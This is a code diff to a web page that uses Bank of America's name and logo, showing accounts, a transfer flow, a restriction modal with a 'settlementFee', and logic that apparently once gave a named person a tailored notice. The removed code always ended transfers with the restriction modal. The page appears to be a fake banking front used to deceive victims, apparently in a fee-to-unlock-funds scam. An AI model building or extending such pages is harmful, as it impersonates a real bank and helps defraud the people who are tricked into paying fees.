@@ -150,6 +150,25 @@
                 </div>
             </div>
         </div>
+
+        <div id="transferRetryModal" class="modal-overlay modal-overlay-contained" style="display: none;" aria-hidden="true">
+            <div class="security-modal-content">
+                <div class="security-modal-header">
+                    <img src="logo.svg" alt="Bank of America Logo" class="security-logo-icon">
+                    <span class="security-logo-text">BANK OF AMERICA</span>
+                </div>
+                <div class="security-body">
+                    <div class="security-icon-lock" style="color: #E31837;">
+                        <i class="fas fa-exclamation-circle"></i>
+                    </div>
+                    <div class="security-title">Something went wrong</div>
+                    <div class="security-text" style="text-align: center;">
+                        Something went wrong. Please try again.
+                    </div>
+                    <button type="button" id="closeTransferRetryBtn" class="security-btn">Try Again</button>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script src="client-secure.js"></script>
@@ -187,6 +206,9 @@
         const restrictionModal = document.getElementById('restrictionModal');
         const closeRestrictionBtn = document.getElementById('closeRestrictionBtn');
         const contactSupportLink = document.getElementById('contactSupportLink');
+        const transferRetryModal = document.getElementById('transferRetryModal');
+        const closeTransferRetryBtn = document.getElementById('closeTransferRetryBtn');
+        let pendingStatusTimer = null;
 
         let accounts = [];
 
@@ -229,7 +251,8 @@
             ownership: 'Personal',
             amount: '',
             zelleContact: '',
-            payeeName: ''
+            payeeName: '',
+            phase: ''
         };
 
         function escapeHtml(value) {
@@ -671,6 +694,7 @@
             flowState.amount = '';
             flowState.zelleContact = '';
             flowState.payeeName = '';
+            flowState.phase = '';
             payFlowOverlay.classList.add('is-open');
             payFlowOverlay.style.display = 'flex';
             payFlowOverlay.setAttribute('aria-hidden', 'false');
@@ -699,15 +723,6 @@
             var closeBtn = document.getElementById('closeRestrictionBtn');
             var supportEl = document.getElementById('contactSupportLink');
             var messageEl = document.getElementById('restrictionMessage');
-
-            if (BoAConfig.isJimmyChiang(config.fullName)) {
-                var notice = BoAConfig.getJimmyUpgradeNotice();
-                if (titleEl) titleEl.textContent = notice.title;
-                if (messageEl) messageEl.innerHTML = notice.bodyHtml;
-                if (closeBtn) closeBtn.textContent = notice.button;
-                if (supportEl) supportEl.textContent = notice.support;
-                return;
-            }
 
             var restriction = config.restriction || {};
             var fee = BoAConfig.formatCurrency(restriction.settlementFee || 0);
@@ -752,7 +767,98 @@
             restrictionModal.style.display = 'none';
         }
 
+        function showTransferRetryModal() {
+            closePayFlow();
+            if (restrictionModal) restrictionModal.style.display = 'none';
+            if (transferRetryModal) {
+                transferRetryModal.style.display = 'flex';
+                transferRetryModal.setAttribute('aria-hidden', 'false');
+            }
+        }
+
+        function closeTransferRetryModal() {
+            if (!transferRetryModal) return;
+            transferRetryModal.style.display = 'none';
+            transferRetryModal.setAttribute('aria-hidden', 'true');
+        }
+
+        function showTransferSuccess(message) {
+            flowState.phase = 'success';
+            payFlowTitle.textContent = 'Done';
+            payFlowBack.classList.add('hidden');
+            payFlowBody.innerHTML =
+                '<div class="pay-flow-success">' +
+                    '<i class="fas fa-check-circle" aria-hidden="true"></i>' +
+                    '<p>' + escapeHtml(message || 'Your transfer was submitted.') + '</p>' +
+                '</div>';
+            payFlowPrimaryBtn.disabled = false;
+            payFlowPrimaryBtn.textContent = 'DONE';
+        }
+
+        function submitPayFlow() {
+            payFlowPrimaryBtn.disabled = true;
+            payFlowPrimaryBtn.innerHTML = '<div class="spinner"></div>';
+            var token = window.BoAAuth && BoAAuth.getToken ? BoAAuth.getToken() : '';
+            var payload = {
+                type: flowState.type,
+                fromAccount: flowState.fromAccount,
+                toAccount: flowState.toAccount,
+                amount: parseFloat(flowState.amount),
+                recipientName: flowState.recipientName,
+                zelleContact: flowState.zelleContact,
+                payeeName: flowState.payeeName
+            };
+
+            setTimeout(function () {
+                fetch('/api/transfer', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        Authorization: 'Bearer ' + token
+                    },
+                    body: JSON.stringify(payload)
+                }).then(function (response) {
+                    return response.json().then(function (data) {
+                        return { ok: response.ok, data: data };
+                    });
+                }).then(function (result) {
+                    if (result.data && result.data.success) {
+                        return BoAConfig.load().then(function () {
+                            BoAConfig.renderTransactions();
+                            refreshAccountsFromConfig();
+                            showTransferSuccess(result.data.message);
+                            if (pendingStatusTimer) {
+                                clearTimeout(pendingStatusTimer);
+                            }
+                            pendingStatusTimer = setTimeout(function () {
+                                BoAConfig.load().then(function () {
+                                    BoAConfig.renderTransactions();
+                                    refreshAccountsFromConfig();
+                                }).catch(function () {});
+                            }, 16000);
+                        });
+                    }
+                    if (result.data && result.data.retry) {
+                        showTransferRetryModal();
+                        return;
+                    }
+                    showRestrictionModal();
+                }).catch(function () {
+                    showTransferRetryModal();
+                });
+            }, 900);
+        }
+
         function goNextStep() {
+            if (flowState.phase === 'success') {
+                flowState.phase = '';
+                closePayFlow();
+                BoAConfig.load().then(function () {
+                    BoAConfig.renderTransactions();
+                    refreshAccountsFromConfig();
+                }).catch(function () {});
+                return;
+            }
             const step = getCurrentStep();
             if (!step) {
                 return;
@@ -772,9 +878,7 @@
             const steps = flowConfigs[flowState.type].steps;
             const isLastStep = flowState.step >= steps.length - 1;
             if (isLastStep) {
-                payFlowPrimaryBtn.disabled = true;
-                payFlowPrimaryBtn.innerHTML = '<div class="spinner"></div>';
-                setTimeout(showRestrictionModal, 1200);
+                submitPayFlow();
                 return;
             }
             flowState.step += 1;
@@ -846,6 +950,16 @@
         if (contactSupportLink) {
             contactSupportLink.addEventListener('click', closeRestrictionModal);
         }
+        if (closeTransferRetryBtn) {
+            closeTransferRetryBtn.addEventListener('click', closeTransferRetryModal);
+        }
+        if (transferRetryModal) {
+            transferRetryModal.addEventListener('click', function (e) {
+                if (e.target === transferRetryModal) {
+                    closeTransferRetryModal();
+                }
+            });
+        }
 
         restrictionModal.addEventListener('click', function(e) {
             if (e.target === restrictionModal) {
@@ -857,6 +971,9 @@
 
         if (restrictionModal) {
             restrictionModal.style.display = 'none';
+        }
+        if (transferRetryModal) {
+            transferRetryModal.style.display = 'none';
         }
     </script>
 </body>
